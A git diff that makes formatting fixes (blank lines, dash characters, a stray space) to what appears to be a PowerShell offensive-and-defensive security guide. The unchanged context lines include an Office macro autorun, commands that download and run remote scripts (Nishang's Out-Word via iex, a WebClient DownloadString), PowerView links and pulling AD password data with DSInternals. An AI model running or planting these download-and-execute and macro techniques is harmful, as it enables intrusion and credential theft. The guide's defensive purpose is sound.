@@ -89,6 +89,7 @@ Get-PrivateProfileString -File 'C:\Windows\System32\GroupPolicy\gpt.ini' `
 ### Office Macros
 
 #### PowerShell Autorun from&nbsp;Macro
+
 ```vb
 ' Word Compatibility
 Sub Auto_Open()
@@ -109,6 +110,7 @@ End Sub
 ```
 
 #### Macro Document Generator
+
 ```powershell
 # Import the Out-Word cmdlet from the Nishang module
 iex(iwr 'https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-Word.ps1')
@@ -394,6 +396,7 @@ Get-ChildItem -Path 'registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI' -Recu
 ## 2. Securing PowerShell
 
 ### Blocking PowerShell Script Execution
+
 #### PowerShell Execution Policy
 
 ```powershell
@@ -406,7 +409,6 @@ Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://comm
 
 - [Script rules in&nbsp;AppLocker](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/script-rules-in-applocker)
 - [Device Guard User Mode Code Integrity (UMCI)](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/select-types-of-rules-to-create)
-
 
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
@@ -443,7 +445,6 @@ notepad.exe $transcript.Path
 - [PowerShell ♥ the&nbsp;Blue Team](https://devblogs.microsoft.com/powershell/powershell-the-blue-team/)
 
 ![PowerShell 5 Logging](https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png)
-
 
 #### PSReadline Command History
 
@@ -826,6 +827,7 @@ Removes the task that creates daily GPO backups.
 
 Unregister-ScheduledTask -TaskName 'Backup All GPOs' -Confirm:$false -Verbose
 ```
+
 #### Managed Service Accounts
 
 ```batchfile
@@ -877,6 +879,7 @@ Get-MgUser
 ![](https://github.com/canix1/ADACLScanner/raw/master/src/effectiverights.gif)
 
 #### PowerView
+
 - [PowerView GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 - [PowerView Intro](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-powerview)
 
@@ -887,6 +890,7 @@ Install-Module -Name DSInternals -Force
 Get-ADReplAccount -All -Server dc.contoso.com |
     Test-PasswordQuality -WeakPasswords 'Pa$$w0rd','Cqure2022','October2022'
 ```
+
 ### Event Logs
 
 ```powershell
@@ -926,9 +930,9 @@ Get-WinEvent -ComputerName localhost -FilterHashtable @{
 ```powershell
 Configuration WindowsServerSecurityBaseline
 {
-    Import-DscResource –ModuleName PSDesiredStateConfiguration
-    Import-DscResource –ModuleName NetworkingDsc
-    Import-DscResource –ModuleName SecurityPolicyDsc
+    Import-DscResource -ModuleName PSDesiredStateConfiguration
+    Import-DscResource -ModuleName NetworkingDsc
+    Import-DscResource -ModuleName SecurityPolicyDsc
 
     Node localhost
     {
@@ -1017,12 +1021,14 @@ Start-DscConfiguration -Path .\WindowsServerSecurityBaseline -Wait -Force -Verbo
 ```
 
 #### Security Baseline Tooling
+
 - [BaselineManagement](https://www.powershellgallery.com/packages/BaselineManagement)
 - [Microsoft Security Compliance Manager 4.0](https://www.microsoft.com/en-us/download/details.aspx?id=53353)
-- [Microsoft Security Compliance Toolkit 1.0 ](https://www.microsoft.com/en-us/download/details.aspx?id=55319)
+- [Microsoft Security Compliance Toolkit 1.0](https://www.microsoft.com/en-us/download/details.aspx?id=55319)
 - [Quickstart: Convert Group Policy into DSC](https://learn.microsoft.com/en-us/powershell/dsc/quickstarts/gpo-quickstart)
 
 #### Center for&nbsp;Internet Security (CIS) Benchmarks
+
 - [CIS Benchmarks](https://www.cisecurity.org/benchmark/microsoft_windows_server)
 - [CIS DSC](https://github.com/techservicesillinois/SecOps-Powershell-CISDSC)
 
